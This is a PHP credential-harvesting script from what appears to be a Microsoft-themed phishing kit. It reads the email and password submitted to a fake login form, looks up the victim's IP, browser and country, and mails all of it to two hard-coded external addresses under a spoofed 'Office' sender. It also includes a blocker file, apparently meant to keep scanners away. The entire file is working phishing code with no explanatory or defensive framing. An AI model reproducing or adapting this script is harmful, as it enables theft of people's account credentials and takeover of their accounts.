<?php
include "bl0cker.php";

class info{
  public $ip;
  public $country;
  public $city;
  public $browser;
  public $time;
  public $date;
  public $date_time;

  public function __construct(){
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $this->country  = "Unknown";
    $this->time = date('h:i:s A');
    $this->date = date('d/m/Y');
    $this->date_time = date('d/m/Y h:i:s A');

    $this->browser = $_SERVER['HTTP_USER_AGENT'];

    if (filter_var($client, FILTER_VALIDATE_IP)){
      $this->ip = $client;
    } elseif (filter_var($forward, FILTER_VALIDATE_IP)){
      $this->ip = $forward;
    } else {
      $this->ip = $remote;
    }

    $data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$this->ip));

    if($data && $data->geoplugin_countryName !== null){
      $this->country = $data->geoplugin_countryName;
      $this->city = $data->geoplugin_city;
    }

  }
}

$email = $_POST['add'];
$password = $_POST['cred'];
$info = new info();

$to = 'systemvc001@yandex.com, systemvc001@gmail.com'; // <--- Enter your email here
$subj = "Microsoft Login - ".$info->ip." ".$info->country;

$headers = "From: 0ffice <logz@couklas.org> \n";
$headers .= "X-Priority: 1\n"; //1 Urgent Message, 3 Normal
$headers .= "MIME-Version: 1.0\n";

$message = "---------------------  Microsoft  ---------------------\n";
$message .= "Email : ".$email."\n";
$message .= "Password : ".$password."\n";
$message .= "IP : ".$info->ip."\n";
$message .= "Country : ".$info->country."\n";
$message .= "---------------------  Account  ---------------------\n";

mail($to,$subj,$message,$headers);
?>   






